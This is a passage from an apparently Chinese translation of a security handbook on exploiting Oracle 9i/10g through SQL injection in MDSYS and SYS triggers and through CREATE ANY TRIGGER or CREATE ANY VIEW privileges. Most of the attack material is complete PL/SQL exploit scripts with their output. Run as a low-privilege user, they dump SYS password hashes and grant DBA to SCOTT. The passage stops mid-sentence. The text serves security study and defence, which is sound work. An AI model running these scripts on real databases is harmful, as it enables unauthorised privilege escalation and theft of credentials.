TRIGGER MYTRIGGER BEFORE INSERT ON MYTABLE</span><br><span class="line">  2  REFERENCING NEW AS NEWROW</span><br><span class="line">  3  FOR EACH ROW</span><br><span class="line">  4  DECLARE</span><br><span class="line">  5  L NUMBER;</span><br><span class="line">  6  S VARCHAR2(2000);</span><br><span class="line">  7  BEGIN</span><br><span class="line">  8  L:=LENGTH(:NEWROW.V);</span><br><span class="line">  9  IF L &gt; 15 THEN</span><br><span class="line"> 10     DBMS_OUTPUT.PUT_LINE(&#x27;INSERTING INTO MYTABLE_LONG AS WELL&#x27;);</span><br><span class="line"> 11     S:=&#x27;INSERT INTO MYTABLE_LONG (V) VALUES (&#x27;&#x27;&#x27; || :NEWROW.V ||</span><br><span class="line">&#x27;&#x27;&#x27;)&#x27;;</span><br><span class="line"> 12     EXECUTE IMMEDIATE S;</span><br><span class="line"> 13  END IF;</span><br><span class="line"> 14  END MYTRIGGER;</span><br><span class="line"> 15 /</span><br><span class="line"></span><br><span class="line">Trigger created.</span><br><span class="line"></span><br><span class="line">SQL&gt; SHOW ERRORS</span><br><span class="line">No errors.</span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES (&#x27;Hello, world!&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES (&#x27;Hello, world! More text...&#x27;);</span><br><span class="line">INSERTING INTO MYTABLE_LONG AS WELL</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES</span><br><span class="line">(&#x27;__________INJECT&#x27;&#x27;POINT__________&#x27;);</span><br><span class="line">INSERTING INTO MYTABLE_LONG AS WELL</span><br><span class="line">INSERT INTO MYTABLE (V) VALUES (&#x27;__________INJECT&#x27;&#x27;POINT__________&#x27;)</span><br><span class="line">*</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-00917: missing comma</span><br><span class="line">ORA-06512: at &quot;SCOTT.MYTRIGGER&quot;, line 9</span><br><span class="line">ORA-04088: error during execution of trigger &#x27;SCOTT.MYTRIGGER&#x27;</span><br></pre></td></tr></table></figure><p>如果您查看触发器的文本，您会发现它容易受到 SQL 注入的攻击。 它获取用户在 INSERT 中提供的值，然后将其连接到另一个 INSERT 语句； 然后触发器执行新的 INSERT 语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S:=&#x27;INSERT INTO MYTABLE_LONG (V) VALUES (&#x27;&#x27;&#x27; || :NEWROW.V || &#x27;&#x27;&#x27;)&#x27;;</span><br><span class="line"></span><br><span class="line">EXECUTE IMMEDIATE S;</span><br></pre></td></tr></table></figure><p>最后一条INSERT语句的结果是错误，说明触发器确实存在SQL注入漏洞。</p><h3 id="利用MDSYS-SDO-GEOM-TRIG-INS1-和-SDO-GEOM-TRIG-INS1触发器"><a href="#利用MDSYS-SDO-GEOM-TRIG-INS1-和-SDO-GEOM-TRIG-INS1触发器" class="headerlink" title="利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器"></a>利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器</h3><p>在 9i 和 10g 的早期版本中，10g 拥有的 SDO_GEOM_TRIG_INS1 触发器很容易受到 SQL 注入的攻击，这与上一节中显示的示例类似。 当对 USER_SDO_GEOM_METADATA 表执行 INSERT 时触发触发器，该表再次归 MDSYS 所有。 由于 PUBLIC 有权插入此表，因此任何人都可以触发触发器。 触发器执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">..</span><br><span class="line">EXECUTE IMMEDIATE</span><br><span class="line">&#x27;SELECT user FROM dual&#x27; into tname;</span><br><span class="line">stmt :=  &#x27;SELECT count(*) FROM SDO_GEOM_METADATA_TABLE &#x27; ||</span><br><span class="line">&#x27;WHERE sdo_owner = &#x27;&#x27;&#x27; || tname || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND sdo_table_name = &#x27;&#x27;&#x27; || :n.table_name || &#x27;&#x27;&#x27; &#x27;||</span><br><span class="line">&#x27;  AND  sdo_column_name = &#x27;&#x27;&#x27; || :n.column_name || &#x27;&#x27;&#x27;  &#x27;;</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>在这里， :new.table_name 和 :new.column_name 会受到用户和注入的 SQL 的影响。 PUBLIC 有权插入此表。 因此，触发器可以被滥用以将 SQL 作为 MDSYS 运行。 例如，低权限用户可以从 USER$ 表中选择 SYS 的密码哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">create or replace function y return varchar2 authid current_user is</span><br><span class="line">buffer varchar2(30);</span><br><span class="line">stmt varchar2(200):=&#x27;select password from sys.user$ where name</span><br><span class="line">=&#x27;&#x27;SYS&#x27;&#x27;&#x27;;</span><br><span class="line">begin</span><br><span class="line">execute immediate stmt into buffer;</span><br><span class="line">dbms_output.put_line(&#x27;SYS passord is: &#x27;|| buffer);</span><br><span class="line">return &#x27;foo&#x27;;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on y to public;</span><br><span class="line">insert into mdsys.user_sdo_geom_metadata (table_name,column_name) values</span><br><span class="line">(&#x27;X&#x27;&#x27; AND SDO_COLUMN_NAME=scott.y--&#x27;,&#x27;test&#x27;);</span><br><span class="line"></span><br><span class="line">returns</span><br><span class="line"></span><br><span class="line">SYS passord is: D9CF6D3630046AC9</span><br><span class="line"></span><br><span class="line">1 row created.</span><br></pre></td></tr></table></figure><p>SDO_GEOM_TRIG_INS1 触发器也由 MDSYS 拥有，以非常相似的方式易受攻击。 当在 MDSYS.USER_SDO_LRS_METADATA 上发生 INSERT 时触发此触发器，并执行以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">stmt := &#x27;SELECT count(*) FROM SDO_LRS_METADATA_TABLE &#x27; ||</span><br><span class="line">&#x27; WHERE sdo_owner = &#x27;&#x27;&#x27;  || UPPER(user_name) || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND  sdo_table_name = &#x27;&#x27;&#x27;  || UPPER(:n.table_name) || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND  sdo_column_name = &#x27;&#x27;&#x27; || UPPER(:n.column_name) || &#x27;&#x27;&#x27; &#x27;;</span><br><span class="line">EXECUTE IMMEDIATE stmt INTO vcount;</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><h3 id="利用MDSYS-SDO-CMT-CBK-TRIG触发器"><a href="#利用MDSYS-SDO-CMT-CBK-TRIG触发器" class="headerlink" title="利用MDSYS SDO_CMT_CBK_TRIG触发器"></a>利用MDSYS SDO_CMT_CBK_TRIG触发器</h3><p>MDSYS 拥有的 SDO_CMT_CBK_TRIG 触发器在对 SDO_TXN_IDX_INSERTS 表（也由 MDSYS 拥有）执行 DELETE 时触发。 PUBLIC 对该表具有 SELECT、INSERT、UPDATE 和 DELETE 对象权限。 因此，任何人都可以通过从表中删除一行来触发 SDO_CMT_CBK_TRIG 触发器。 这个触发器不容易受到 SQL 注入的攻击，而是一个更有趣和微妙的漏洞。 这会影响 9i 和 10g 的早期版本。  解释变得有点详细和复杂。</p><p>如果您检查触发器的文本，您可以看到在 DELETE 实际发生之前，会从 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中选择一个函数列表，然后执行这些函数。</p><p>如果攻击者能够以某种方式在这些表中列出他们自己的函数，那么它们也会在触发器触发时被执行。 PUBLIC 没有为这些表中的任何一个设置对象权限，因此它们不能直接插入自己的函数名称。但是，MDSYS 拥有的 PRVT_CMT_CBK 包有两个过程，CCBKAPPLROWTRIG 和 EXEC_CBK_FN_DML，它们将模式和函数名称作为参数，然后插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中。 PUBLIC 对 PRVT_CMT_CBK 包具有 EXECUTE 权限，并且因为它没有用 ‘AUTHID CURRENT_USER’ 关键字定义，所以包使用 MDSYS的定义者而不是调用者的权限执行。因此，任何人都可以将函数名间接插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中。因此，当 SDO_TXN_IDX_INSERTS 上发生 DELETE 时，任何人都可以影响 SDO_CMT_CBK_TRIG 触发器采取的操作 - 换句话说，任何人都可以获得触发器来执行任意函数。更重要的是，这个函数在触发器中执行时，将以 MDSYS 的权限运行，攻击者可以利用它来获得提升的权限。</p><p>此示例脚本将由 SCOTT 等低权限用户运行，将获取 SYS 帐户的密码哈希。 为此，它首先创建一个名为 USERS_AND_PASSWORDS 的表。 此表是 SYS 帐户的密码哈希结束的位置。 然后创建函数 GET_USERS_AND_PWDS。 这是攻击者放置他们的 SQL 漏洞利用代码的地方。 在这种情况下，该函数利用 MDSYS 具有 SELECT ANY TABLE 特权从 USER$ 表中选择 SYS 的密码哈希这一事实。 创建表和函数后，PUBLIC 就可以访问它们。 这使 MDSYS 能够访问它们。 在此之后，执行 MDSYS.PRVT_CMT_CBK.CCBKAPPLROWTRIG 和 MDSYS.PRVT_CMT_CBK.EXEC_CBK_FN_DML 过程，将模式 SCOTT 和函数 GET_USERS_AND_PWDS 插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK 表中。</p><p>一切就绪后，将一行插入到 SDO_TXN_IDX_INSERTS 中，然后删除。 当删除发生时，触发器被触发，它检索 SCOTT.GET_USERS_AND_PWDS 函数，然后执行它。 当函数执行时，SYS 的密码哈希从 SYS.USER$ 中选择，然后插入到 SCOTT 的 USERS_AND_PASSWORDS 表中。 最后，SCOTT 从表中选择散列，然后将其输入到他的 Oracle 密码破解程序中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE USERS_AND_PASSWORDS (USERNAME VARCHAR2(200), PASSWORD</span><br><span class="line">VARCHAR2(200));</span><br><span class="line">/</span><br><span class="line">GRANT SELECT ON USERS_AND_PASSWORDS TO PUBLIC;</span><br><span class="line">GRANT INSERT ON USERS_AND_PASSWORDS TO PUBLIC;</span><br><span class="line">CREATE OR REPLACE FUNCTION GET_USERS_AND_PWDS(DUMMY1 VARCHAR2, DUMMY2</span><br><span class="line">VARCHAR2) RETURN NUMBER AUTHID CURRENT_USER IS</span><br><span class="line">BEGIN</span><br><span class="line">      EXECUTE IMMEDIATE &#x27;INSERT INTO SCOTT.USERS_AND_PASSWORDS</span><br><span class="line">(USERNAME,PASSWORD) VALUES ((SELECT NAME FROM SYS.USER$ WHERE NAME =</span><br><span class="line">&#x27;&#x27;SYS&#x27;&#x27;),(SELECT PASSWORD FROM SYS.USER$ WHERE NAME = &#x27;&#x27;SYS&#x27;&#x27;))&#x27;;</span><br><span class="line">      RETURN 1;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">GRANT EXECUTE ON GET_USERS_AND_PWDS TO PUBLIC;</span><br><span class="line">EXEC MDSYS.PRVT_CMT_CBK.CCBKAPPLROWTRIG(&#x27;SCOTT&#x27;,&#x27;GET_USERS_AND_PWDS&#x27;);</span><br><span class="line">EXEC</span><br><span class="line">MDSYS.PRVT_CMT_CBK.EXEC_CBK_FN_DML(0,&#x27;AAA&#x27;,&#x27;BBB&#x27;,&#x27;SCOTT&#x27;,&#x27;GET_USERS_AND_</span><br><span class="line">PWDS&#x27;);</span><br><span class="line">INSERT INTO MDSYS.SDO_TXN_IDX_INSERTS (SDO_TXN_IDX_ID,RID)</span><br><span class="line">VALUES(&#x27;FIRE&#x27;,&#x27;FIRE&#x27;);</span><br><span class="line">DELETE FROM MDSYS.SDO_TXN_IDX_INSERTS WHERE SDO_TXN_IDX_ID = &#x27;FIRE&#x27;;</span><br><span class="line">SELECT * FROM USERS_AND_PASSWORDS;</span><br></pre></td></tr></table></figure><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/8.png"></p><h3 id="利用SYS-CDC-DROP-CTABLE-BEFORE触发器"><a href="#利用SYS-CDC-DROP-CTABLE-BEFORE触发器" class="headerlink" title="利用SYS.CDC_DROP_CTABLE_BEFORE触发器"></a>利用SYS.CDC_DROP_CTABLE_BEFORE触发器</h3><p>SYS 拥有的 10g 第 2 版上的 CDC_DROP_CTABLE_BEFORE 触发器容易受到 SQL 注入的攻击。 （默认情况下，10g 第 1 版不易受到攻击，因为虽然触发器存在，但并未启用。）每当删除表时，触发器就会触发，并执行 sys.dbms_cdc_ipublish.change_table_trigger 过程。 此过程调用 ChangeTable Trigger Java 方法，该方法执行以下 SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sqltext = &quot;SELECT COUNT(*) FROM SYS.CDC_CHANGE_TABLES$ WHERE</span><br><span class="line">CHANGE_TABLE_SCHEMA=&#x27;&quot; + schema + &quot;&#x27; AND CHANGE_TABLE_NAME=&#x27;&quot; +</span><br><span class="line">tableName + &quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>由于通过使用嵌入式 SQL 创建表名，将要删除的表的名称逐字放入此 SELECT 查询中，因此我们可以以 SYS 身份执行 SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; connect scott/tiger</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt; -- create the function we&#x27;re going to inject</span><br><span class="line">SQL&gt; create or replace function gp return varchar2 authid current_user</span><br><span class="line">SQL&gt; is</span><br><span class="line">  2 STMT VARCHAR2(400):= &#x27;select password from dba_users where username</span><br><span class="line">= &#x27;&#x27;SYS&#x27;&#x27;&#x27;;</span><br><span class="line">  3  P VARCHAR2(200);</span><br><span class="line">  4  BEGIN</span><br><span class="line">  5  EXECUTE IMMEDIATE STMT INTO P;</span><br><span class="line">  6  dbms_output.put_line(&#x27;SYS password is &#x27;|| P);</span><br><span class="line">  7  RETURN &#x27;SUCCESS&#x27;;</span><br><span class="line">  8  END;</span><br><span class="line">  9  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT EXECUTE ON GP TO PUBLIC;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; -- create a table with our function name embedded</span><br><span class="line">SQL&gt; create table &quot;O&#x27;||SCOTT.GP||&#x27;O&quot; (x number);</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; -- now drop the table and cause the trigger to fire</span><br><span class="line">SQL&gt; drop table &quot;O&#x27;||SCOTT.GP||&#x27;O&quot;;</span><br><span class="line"></span><br><span class="line">SYS password is B747B510C5F70DED</span><br></pre></td></tr></table></figure><h3 id="利用MDSYS-SDO-DROP-USER-BEFORE触发器"><a href="#利用MDSYS-SDO-DROP-USER-BEFORE触发器" class="headerlink" title="利用MDSYS.SDO_DROP_USER_BEFORE触发器"></a>利用MDSYS.SDO_DROP_USER_BEFORE触发器</h3><p>在 10g 第 2 版中，MDSYS 拥有的 SDO_DROP_USER_BEFORE 触发器容易受到 SQL 注入攻击。 但是，在 10g 第 2 版中，MDSYS 没有那么多权限，而它是 Oracle 9i 中的 DBA。 这给我们带来了一个重要的问题，也是一个完美的地方来完成本章并继续下一章：当您所利用的东西的所有者不是 DBA 时，如何获得 DBA 特权？ 您将在下一章中学习如何执行此操作。</p><h2 id="间接特权提升"><a href="#间接特权提升" class="headerlink" title="间接特权提升"></a>间接特权提升</h2><p>在非 DBA 用户拥有的代码中存在错误的情况下会发生什么？ 是否仍有可能利用该漏洞并获得 DBA 权限？ 嗯，答案取决于多种因素，例如易受攻击的用户实际拥有的特权。 在本章中，我们将研究如何滥用某些权限来获得 DBA 权限； 而且，正如您将看到的，有些比其他更容易。 从上一章继续，我们将首先查看 CREATE ANY TRIGGER 权限。 事实上，许多 CREATE ANY 特权意味着您离 DBA 特权仅一步之遥，但您还将看到，即使只是 CREATE PROCEDURE 特权也常常会导致 DBA。</p><h3 id="从CREATE-ANY-TRIGGER获取DBA"><a href="#从CREATE-ANY-TRIGGER获取DBA" class="headerlink" title="从CREATE ANY TRIGGER获取DBA"></a>从CREATE ANY TRIGGER获取DBA</h3><p>使用上一章中的示例，假设您有一个帐户 MDSYS，该帐户拥有一个容易受到 SQL 注入攻击的触发器。 在 10g 第 2 版中，MDSYS 不是 DBA，但它确实具有 CREATE ANY TRIGGER 系统特权。 这可以用来获得 DBA 权限。 您可能已经猜到或已经知道，CREATE ANY TRIGGER 权限允许被授权者在任何模式中创建触发器，唯一的限制是触发器不能放置在 SYS 拥有的对象上。 从 CREATE ANY TRIGGER 到 DBA 的过程如下。</p><p>首先，您确定谁是系统上的 DBA 以及他们拥有哪些表或视图，PUBLIC 可以从哪些表或视图中插入、更新或删除。 SYSTEM 用户提供了一个很好的例子。 默认情况下，它是一个 DBA，它拥有许多 PUBLIC 可以对其执行 DML 操作的表。 一旦找到 DBA，您就可以在他们的模式中为该表创建一个触发器，然后执行设置为触发它的 DML 操作。 触发器里面的东西是关键，因为触发器以所有者的权限执行； 在 SYSTEM 的情况下，您需要获取触发器来执行您创建为 AUTHID CURRENT_USER 的过程。 您可以做任何您想做的事情，因为 SYSTEM 会进入此过程。 让我们看一下 MDSYS 示例。</p><p>MDSYS.SDO_DROP_USER_BEFORE 触发器在执行 drop user 命令时执行。 此外，由于触发器是“之前”触发器 - 因此在采取任何操作之前触发 - 被删除的用户不一定存在，并且发出命令的用户不必具有删除用户的权限 。因此，任何人都可以发出 DROP USER FOO 并且触发器将在后台触发。 如果您查看 SDO_DROP_USER_BEFORE 触发器，您可以看到它执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE IMMEDIATE</span><br><span class="line">          &#x27;begin &#x27; ||</span><br><span class="line">            &#x27;mdsys.rdf_apis_internal.&#x27; ||</span><br><span class="line">            &#x27;notify_drop_user(&#x27;&#x27;&#x27; || dictionary_obj_name || &#x27;&#x27;&#x27;); &#x27; ||</span><br><span class="line">          &#x27;end;&#x27;;</span><br></pre></td></tr></table></figure><p>这里，dictionary_obj_name 是被删除的用户。 可以在此处注入任意 PL/SQL，如下例所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; connect scott/tiger</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; drop user &quot;uu&#x27;);dbms_output.put_line(&#x27;AA&quot;;</span><br><span class="line">AA</span><br><span class="line">drop user &quot;uu&#x27;);dbms_output.put_line(&#x27;AA&#x27;</span><br><span class="line">          *</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-01918: user &#x27;uu&#x27;);dbms_output.put_line(&#x27;AA&#x27; does not exist</span><br></pre></td></tr></table></figure><p>注意第六行的 AA。 这是将 DBMS_OUTPUT.PUT_LINE(‘AA’ 注入到 DROP USER 语句中的输出。现在让我们继续并从这里获取 DBA 权限，如前所述。我们将注入一个在 SYSTEM.OL$ 表上创建触发器的过程 , PUBLIC 具有 INSERT 的权限。创建后，您插入到 OL$ 表中，触发触发器并获得 DBA 权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">connect scott/tiger</span><br><span class="line">set serveroutput on</span><br><span class="line"></span><br><span class="line">-- this procedure will grant scott dba privs</span><br><span class="line">-- it will be executed from the trigger we&#x27;re</span><br><span class="line">-- about to create in the SYSTEM schema</span><br><span class="line">-- on the OL$ table</span><br><span class="line"></span><br><span class="line">create or replace procedure z authid current_user is</span><br><span class="line">PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE &#x27;GRANT DBA TO SCOTT&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on Z to public;</span><br><span class="line"></span><br><span class="line">-- This is the function that creates the trigger</span><br><span class="line">-- This will be called from the procedure we inject</span><br><span class="line"></span><br><span class="line">create or replace function tcf return varchar2 authid current_user is</span><br><span class="line">PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">STMT VARCHAR2(400):= &#x27;create or replace trigger&#x27;</span><br><span class="line">||&#x27; system.the_trigger &#x27;</span><br><span class="line">||&#x27; before insert on &#x27;</span><br><span class="line">||&#x27; system.OL$ &#x27;</span><br><span class="line">||&#x27; DECLARE msg VARCHAR2(30); BEGIN SCOTT.Z;</span><br><span class="line">dbms_output.put_line(&quot;aa&quot;);</span><br><span class="line">end the_trigger;&#x27;;</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE STMT;</span><br><span class="line">COMMIT;</span><br><span class="line">RETURN &#x27;SUCCESS&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on tcf to public;</span><br><span class="line"></span><br><span class="line">-- this is the procedure we inject into the drop user statement</span><br><span class="line"></span><br><span class="line">create or replace procedure g(v varchar2) authid current_user is</span><br><span class="line">BEGIN</span><br><span class="line">dbms_output.put_line(scott.tcf);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on g to public;</span><br><span class="line"></span><br><span class="line">-- now we launch it all</span><br><span class="line"></span><br><span class="line">drop user &quot;&#x27;);scott.g(&#x27;&quot;;</span><br><span class="line"></span><br><span class="line">-- The trigger should be created now</span><br><span class="line">-- Time to fire it and get dba privs</span><br><span class="line"></span><br><span class="line">insert into system.OL$ (OL_NAME) VALUES (&#x27;OWNED!&#x27;);</span><br><span class="line"></span><br><span class="line">connect scott/tiger</span><br><span class="line">set serveroutput on</span><br><span class="line">SELECT USERNAME,PASSWORD FROM DBA_USERS;</span><br><span class="line">DROP TRIGGER SYSTEM.THE_TRIGGER;</span><br></pre></td></tr></table></figure><h3 id="从CREATE-ANY-VIEW获取DBA"><a href="#从CREATE-ANY-VIEW获取DBA" class="headerlink" title="从CREATE ANY VIEW获取DBA"></a>从CREATE ANY VIEW获取DBA</h3><p>您可以以类似的方式利用 CREATE ANY VIEW。 默认情况下，在 10g 第 2 版中，授予此权限的唯一用户是 SYS； 如果您可以将 SQL 注入 SYS 过程，那么您无论如何都已经是 DBA。 出于说明目的，让我们假设一个具有此权限的测试用户并创建一个易受攻击的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">connect / as sysdba</span><br><span class="line">create user vtest identified by vtest;</span><br><span class="line">grant create session to vtest;</span><br><span class="line">grant create any view to vtest;</span><br><span class="line">grant create procedure to vtest;</span><br><span class="line"></span><br><span class="line">-- now connect as vtest</span><br><span class="line">connect vtest/vtest</span><br><span class="line">set serveroutput on</span><br><span class="line">-- create a vulnerable procedure</span><br><span class="line">create or replace procedure vproc (vt varchar2) is</span><br><span class="line">stmt varchar2(200);</span><br><span class="line">num number;</span><br><span class="line">begin</span><br><span class="line">stmt:=&#x27;select count(*) from &#x27; || vt;</span><br><span class="line">execute immediate stmt into num;</span><br><span class="line">dbms_output.put_line(num);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on vproc to public;</span><br><span class="line">-- test it</span><br><span class="line">exec vproc(&#x27;ALL_OBJECTS&#x27;);</span><br></pre></td></tr></table></figure><p>有了我们的易受攻击的程序和具有 CREATE ANY VIEW 权限的测试用户，让我们开始利用它来获得 DBA 权限。</p><p>我们需要在 DBA 的模式中创建视图，然后以某种方式让高权限用户访问该视图。 第二部分可能听起来很难，但实际上并非如此。 SYS 拥有的数百个过程实例将视图或表的名称作为参数，然后它进行访问。 出于演示目的，让我们节省时间并快速创建我们自己的 - 通过使用 DBMS_ASSERT.QUALIFIED_SQL_NAME 函数确保它不会受到 SQL 注入的影响：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">connect / as sysdba</span><br><span class="line">create or replace procedure sproc (vt varchar2) is</span><br><span class="line">stmt varchar2(200);</span><br><span class="line">num number;</span><br><span class="line">begin</span><br><span class="line">stmt:=&#x27;select count(*) from &#x27; || dbms_assert.qualified_sql_name(vt);</span><br><span class="line">execute immediate stmt into num;</span><br><span class="line">dbms_output.put_line(num);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on sproc to public;</span><br></pre></td></tr></table></figure><p>好的，现在来获得 DBA 权限。 我们要做的是将我们自己的过程注入到 VTEST.VPROC 过程中，该过程在 SYSTEM 模式中创建一个视图。 我们在这里选择 SYSTEM 模式是因为 CREATE ANY VIEW 权限不允许我们在 SYS 模式中创建视图。 我们创建的视图将调用我们拥有的函数，并将我们的最终代码放在此处以获取 DBA 权限。 当我们通过 